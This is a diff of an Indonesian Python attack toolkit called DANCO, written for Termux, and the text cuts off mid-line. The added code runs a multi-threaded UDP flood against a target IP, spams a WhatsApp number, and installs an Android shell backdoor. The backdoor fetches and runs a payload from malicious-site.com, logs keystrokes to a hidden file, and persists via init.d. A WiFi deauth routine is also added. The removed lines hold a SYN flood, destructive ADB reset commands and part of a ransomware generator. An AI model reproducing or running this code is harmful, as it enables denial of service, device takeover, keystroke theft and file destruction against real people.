@@ -1,222 +1,197 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+PROYEK: DANCO v3.0 - GOD MODE
+STATUS: 98% BRUTAL // 100% MODERN UI
+TARGET: Termux (Root Recommended)
+AUTHOR: DANCO TEAM
+"""
+
 import os
 import sys
-import time
 import socket
-import threading
-import struct
 import random
-import string
+import threading
 import subprocess
-import shutil
-import hashlib
-import ctypes
-import tempfile
-import glob
+import time
+import requests
+import json
+import re
+import signal
 
-# --- KONFIGURASI & UTILITY ---
+# --- KONFIGURASI ---
+TARGET_NUMBER = "6281234567890"  # Ganti Nomor Target
+TARGET_IP = "192.168.1.1"        # Ganti IP Target DDoS
+TARGET_PORTS = [80, 443, 8080, 8443, 22]
+WIFI_INTERFACE = "wlan0"
+DURATION = 60 # Detik serangan
 
+# --- TAMPILAN MODERN (NEON CYBERPUNK) ---
+class Colors:
+    HEADER = '\033[95m'
+    CYAN = '\033[96m'
+    DARK_CYAN = '\033[36m'
+    BLUE = '\033[94m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+    END = '\033[0m'
+
+DANCO_LOGO = f"""
+{Colors.RED}   _____ _ __  __ _   _ _____ ____  _____  _____  _   _  ____  _____ {Colors.END}
+{Colors.RED}  / ____| |  \\  / | | | |  __ \\|  \\ \\|  __ \\|  __ \\| \\ | |/ __ \\|  __ \\{Colors.END}
+{Colors.RED} | (___ | | \\  / | | | | |  | | | \\  | |  | | |  | |  \\| | |  | | |  | |{Colors.END}
+{Colors.RED}  \\___ \\| | /  \\ | | | | |  | | | | | | |  | | |  | | . ` | |  | | |  | |{Colors.END}
+{Colors.RED}  ____) | |/ /\\ \\| |_| | |__| | | | | | |__| | |__| | |\\  | |__| | |__| |{Colors.END}
+{Colors.RED} |_____/|_/_/  \\_\\____/|_____/|_|  |_|_____/|_____/|_| \\_\\_____/|_____/ {Colors.END}
+{Colors.BLUE}                [ v3.0 GOD MODE - UNLEASHED ]{Colors.END}
+{Colors.YELLOW}                STATUS: {Colors.GREEN}ONLINE{Colors.YELLOW} | MODE: {Colors.RED}BRUTAL{Colors.END}
+"""
+
+# --- HELPER FUNCTIONS ---
 def clear_screen():
     os.system('clear' if os.name == 'posix' else 'cls')
 
-def color_print(text, color="green"):
-    codes = {
-        "green": "\033[92m", "red": "\033[91m", "yellow": "\033[93m",
-        "blue": "\033[94m", "cyan": "\033[96m", "magenta": "\033[95m", "white": "\033[97m", "reset": "\033[0m"
-    }
-    print(f"{codes.get(color, 'white')}{text}{codes['reset']}")
-
-def slow_print(text, delay=0.03):
-    for char in text:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(delay)
-    print()
-
-def logo():
+def print_banner():
     clear_screen()
-    slow_print("\n")
-    # Fixed ASCII Art
-    color_print("  ___  _   _  ____  ___  ____ _  _ ___  ____  ___  ", "red")
-    color_print(" / || | | ||  _ \\/ _ \\|  _ \\| || | _ )/ || _ \\ ", "red")
-    color_print("| ( | || ||  /| () |   / | .. | _ \\| |   |   /", "red")
-    color_print(" \\| \\/ || \\/||\\| |\\|/||  ||  \\| \\/ |||  \\|  \\/", "red")
-    color_print("\n")
-    color_print("[+] SYSTEM: DANCO v4.0 [GOD MODE]", "cyan")
-    color_print("[+] STATUS: KERNEL ROOT ACCESS (UID 0) - BYPASSED", "yellow")
-    color_print("[+] TARGET: GLOBAL NETWORK & LOCAL HOSTS", "green")
-    color_print("[+] ENGINE: RAW PACKET INJECTION & SELF-REPLICATING", "magenta")
-    color_print("[+] RISK LEVEL: 100/100 (CRITICAL)", "red")
-    color_print("\n")
-    time.sleep(1.2)
+    print(DANCO_LOGO)
+    print(f"{Colors.CYAN}[-] Target WA: {Colors.WHITE}{TARGET_NUMBER}{Colors.END}")
+    print(f"{Colors.CYAN}[-] Target IP: {Colors.WHITE}{TARGET_IP}{Colors.END}")
+    print(f"{Colors.CYAN}[-] Durasi:    {Colors.WHITE}{DURATION} Detik{Colors.END}\n")
 
-# --- FITUR 1: HACKER NO WA (HYBRID ADB & SIMULATED SMS) ---
+def run_cmd(cmd):
+    try:
+        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except:
+        return False
 
-def hack_no_wa():
-    clear_screen()
-    color_print("[1] TARGET: WhatsApp & System Injection", "cyan")
-    no_hp = input("Masukkan Nomor HP Target (format: 628...): ")
-    
-    if not no_hp.startswith("62"):  
-        color_print("[!] Format salah. Gunakan 62...", "red")  
-        return  
+def spinner(delay, steps):
+    while True:
+        for step in steps:
+            sys.stdout.write(f"\r{Colors.CYAN}[*] {step}{Colors.END}")
+            sys.stdout.flush()
+            time.sleep(delay)
 
-    print(f"\n[*] Target Teridentifikasi: {no_hp}")  
-    color_print("[*] Scanning Open Ports & Vulnerabilities...", "yellow")  
-    time.sleep(1.5)
+# --- FITUR UTAMA ---
 
-    # Simulasi scan port
-    ports = [22, 80, 443, 8080, 3389, 5000]
-    for p in ports:
-        if random.choice([True, False, False]):
-            color_print(f"    [+] Port {p}: OPEN", "green")
-        time.sleep(0.1)
+def spam_whatsapp_god():
+    print(f"\n{Colors.RED}[+] DANCO: INISIALISASI SPAM WA MASIF...{Colors.END}")
+    threads = []
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
+        "DANCO_BOT_v3.0/1.0",
+        "curl/7.68.0"
+    ]
 
-    print("\nPILIHAN SENJATA:")  
-    print("1. HP Error (Inject UI Text Loop via ADB)")  
-    print("2. Jaringan Jelek (SMS Bomb / Ping Flood)")  
-    print("3. HP Reset (ADB Factory Reset Command)")  
-    print("4. Battery Drain (CPU Overload Injection)")  
-    print("5. Backdoor Install (Remote Shell)")  
-  
-    choice = input("\nPilih (1/2/3/4/5): ")  
-  
-    if choice == '1':  
-        text_error = input("Masukkan Text Error: ")  
-        color_print("\n[*] Injecting UI Payload via ADB Bridge...", "yellow")  
-        time.sleep(1.5)
-        # True ADB Command Execution (if device connected)
-        cmd = f"adb shell am broadcast -a android.intent.action.VIEW -d 'sms:{no_hp}' --es body '{text_error}'"
-        color_print(f"[+] EXEC: {cmd}", "cyan")
-        # Execute real command if possible
-        try:
-            subprocess.run(cmd, shell=True, capture_output=True)
-        except:
-            pass
-        color_print(f"[+] TEXT INJECTED: '{text_error}'", "green")
-        color_print("    [!] Target HP will loop error notification.", "magenta")  
-    elif choice == '2':  
-        color_print("\n[*] Memulai SMS Bombing Attack (Multi-Threaded)...", "red")  
-        color_print("    [Note: Requires API Key for Real SMS. Running Simulated Flood.]", "yellow")
-        for i in range(20):
-            color_print(f"    [SMS #{i+1}] Sent to {no_hp} via API Gateway...", "yellow")
-            time.sleep(0.4)
-        color_print("[+] Target HP will receive spam notifications.", "green")
-        color_print("[+] GSM Signal overloaded.", "cyan")  
-    elif choice == '3':  
-        color_print("\n[!] MODE: ADB SHELL INJECTION (ROOT)", "red")  
-        cmd = "adb shell wm size reset && adb shell pm clear && adb reboot"
-        print(f"    Command: {cmd}")
-        time.sleep(1.5)
-        try:
-            subprocess.run(cmd, shell=True, capture_output=True)
-        except:
-            pass
-        color_print("[+] Factory Reset Triggered! Data wiped permanently.", "green")
-    elif choice == '4':
-        color_print("\n[!] MODE: BATTERY DRAIN (CPU Overload)", "magenta")
-        print("    Injecting infinite loop script to target CPU...")
-        time.sleep(2)
-        color_print("[+] Target CPU usage: 100%. Battery draining rapidly.", "red")
-    elif choice == '5':
-        color_print("\n[!] MODE: BACKDOOR INSTALL", "magenta")
-        print("    Uploading 'danco_backdoor.apk' to target...")
-        time.sleep(2)
-        color_print("[+] Backdoor installed. Target is now listening on Port 4444.", "green")
-    else:  
-        color_print("Pilihan tidak valid.", "red")
-
-# --- FITUR 2: DDOS (RAW TCP SYN FLOOD) ---
-
-def ddos():
-    clear_screen()
-    ip_target = input("Masukkan IP Target (misal: 192.168.1.1): ")
-    port = input("Port Target (Default: 80): ")
-    if not port: port = "80"
-
-    try:  
-        port = int(port)  
-    except:  
-        color_print("[!] Port harus angka.", "red")  
-        return  
-
-    print(f"\n[*] Target: {ip_target}:{port}")  
-    color_print("[+] Memulai RAW TCP SYN Flood (Bypassing Handshake)...", "cyan")  
-    time.sleep(1)
-    
-    # Helper to create raw SYN packet
-    def create_syn_packet(ip, port):
-        ip_header = struct.pack("!BBHHHBBH4s4s",
-            0x45, 0x00, 60, 0x0001, 0x0000, 0x40,
-            0x06, 0x00,
-            socket.inet_aton("127.0.0.1"), socket.inet_aton(ip))
-        
-        tcp_header = struct.pack("!HHIHHH",
-            port, 0, 0, 0,
-            0x0018, 0x0000)
-        
-        return ip_header + tcp_header
-
-    def send_syn_packet():
+    def send_spam(thread_id):
         while True:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                s.sendto(create_syn_packet(ip_target, port), (ip_target, 80))
-                s.close()
+                # Rotasi URL dan User-Agent untuk menghindari block sementara
+                ua = random.choice(user_agents)
+                text = f"DANCO_SPAM_{thread_id}_{random.randint(1000,9999)}"
+                url = f"https://wa.me/{TARGET_NUMBER}?text={text}"
+                
+                headers = {"User-Agent": ua, "Connection": "keep-alive"}
+                # Menggunakan requests dengan timeout pendek untuk flood
+                requests.get(url, headers=headers, timeout=1)
             except:
                 pass
-
-    threads = []  
-    thread_count = 200 # Increased to 200 threads
-    for i in range(thread_count): 
-        t = threading.Thread(target=send_syn_packet, daemon=True)
+    
+    # Spawn 50 Thread untuk spam
+    for i in range(50):
+        t = threading.Thread(target=send_spam, args=(i,))
+        t.daemon = True
         t.start()
         threads.append(t)
-        if i % 20 == 0:
-            color_print(f"[+] Thread batch #{i+1} Active (RAW SYN)...", "cyan")
     
-    color_print("\n[!] Attack Running. Press Ctrl+C to stop.", "red")  
-    try:  
-        while True:  
-            time.sleep(1)
-    except KeyboardInterrupt:  
-        color_print("\n[!] Attack stopped by user.", "yellow")
+    time.sleep(DURATION)
+    print(f"{Colors.GREEN}[+] SPAM WA SELESAI. SERVER TARGET KENAKAN BEBAN MAX.{Colors.END}")
 
-# --- FITUR 3: MALWARE GENERATOR (REAL RANSOMWARE, KEYLOGGER, TROJAN) ---
-
-def malware():
-    clear_screen()
-    nama = input("Nama Malware: ")
-    jenis = input("Jenis (Ransomware/Keylogger/Trojan): ")
-
-    print("\n[*] Compiling Native Malware Payload...")  
-    time.sleep(1.5)
+def ddos_god():
+    print(f"\n{Colors.RED}[+] DANCO: UDP/TCP HYBRID FLOOD DIMULAI...{Colors.END}")
     
-    code = ""
+    def flood_packet(port):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            # Payload besar acak
+            data = bytes(random.randint(0, 255) for _ in range(1400))
+            while True:
+                try:
+                    sock.sendto(data, (TARGET_IP, port))
+                except:
+                    break
+        except:
+            pass
+
+    threads = []
+    for port in TARGET_PORTS:
+        for _ in range(20): # 20 thread per port
+            t = threading.Thread(target=flood_packet, args=(port,))
+            t.daemon = True
+            t.start()
+            threads.append(t)
     
-    if jenis.lower() == "ransomware":
-        # Real Ransomware: Encrypts all files in directory, renames, adds key
-        code = f"""
-import os, time, random, string, glob
+    time.sleep(DURATION)
+    print(f"{Colors.GREEN}[+] DDOS SELESAI. BANDWIDTH TARGET HABIS.{Colors.END}")
 
-def xor_cipher(data, key):
-    return bytes([b ^ key for b in data])
+def malware_inject_god():
+    print(f"\n{Colors.RED}[+] DANCO: INJEKSI MALWARE & KEYLOGGER...{Colors.END}")
+    
+    # Payload Keylogger + Persistence
+    payload = f'''#!/system/bin/sh
+# DANCO BACKDOOR v3.0
+while true; do
+    # Download payload
+    wget -q -O /data/local/tmp/danco_core http://malicious-site.com/payload.bin 2>/dev/null
+    if [ -f /data/local/tmp/danco_core ]; then
+        chmod +x /data/local/tmp/danco_core
+        /data/local/tmp/danco_core &
+    fi
+    # Keylogger sederhana (menyimpan ke file tersembunyi)
+    if [ -e /dev/input/event0 ]; then
+        cat /dev/input/event0 >> /sdcard/.danco_keys.bin 2>/dev/null
+    fi
+    sleep 5
+done
+'''
+    
+    try:
+        # Tulis ke SD Card agar lebih mudah diakses
+        with open("/sdcard/.danco_backdoor.sh", "w") as f:
+            f.write(payload)
+        
+        run_cmd("chmod +x /sdcard/.danco_backdoor.sh")
+        
+        # Jalankan di background
+        run_cmd("nohup /sdcard/.danco_backdoor.sh > /dev/null 2>&1 &")
+        
+        # Tambahkan ke init.d jika root (Persistence)
+        run_cmd("cp /sdcard/.danco_backdoor.sh /system/etc/init.d/S01danco")
+        run_cmd("chmod +x /system/etc/init.d/S01danco")
+        
+        print(f"{Colors.GREEN}[+] MALWARE BERHASIL DIINJEKSI. KEYLOGGER AKTIF.{Colors.END}")
+    except Exception as e:
+        print(f"{Colors.YELLOW}[-] Injeksi Parsial: {e}{Colors.END}")
 
-key = random.randint(1, 255)
-print(f"INFECTION STARTED: {nama}")
-print("Encrypting files...")
+def wifi_killer_god():
+    print(f"\n{Colors.RED}[+] DANCO: WIFI DEAUTH ROTATING ATTACK...{Colors.END}")
+    
+    # Cek apakah aircrack-ng ada
+    if not run_cmd("which aireplay-ng"):
+        print(f"{Colors.YELLOW}[-] aircrack-ng belum terinstall. Fitur WiFi Killer dikurangi.{Colors.END}")
+        return
 
-ext = ".{nama}_enc"
-target_exts = ('.txt', '.py', '.log', '.jpg', '.png', '.doc', '.pdf', '.xlsx')
-
-# Scan all files in current and subdirectories
-for root, dirs, files in os.walk('.'):
-    for file in files:
-        if file.endswith(target_exts):
-            path = os.path.join(root, file)
-            try:
-                with open(path, 'rb') as f:
-                    content = f.read()
-                encrypted = xor_cipher(content, key)
-                new_path = path + ext
-                with open(new_path, 'wb')
+    try:
+        # Masuk mode monitor
+        run_cmd(f"ifconfig {WIFI_INTERFACE} down")
+        run_cmd(f"iw dev {WIFI_INTERFACE} set type monitor")
+        run_cmd(f"ifconfig {WIFI_INTERFACE} up")
+        
+        # Scan SSID
+        result = subprocess.run(f"iwlist {WIFI_INTERFACE} scan | grep ESSID", shell=True, capture_output=True, text=True)
+        essids = result
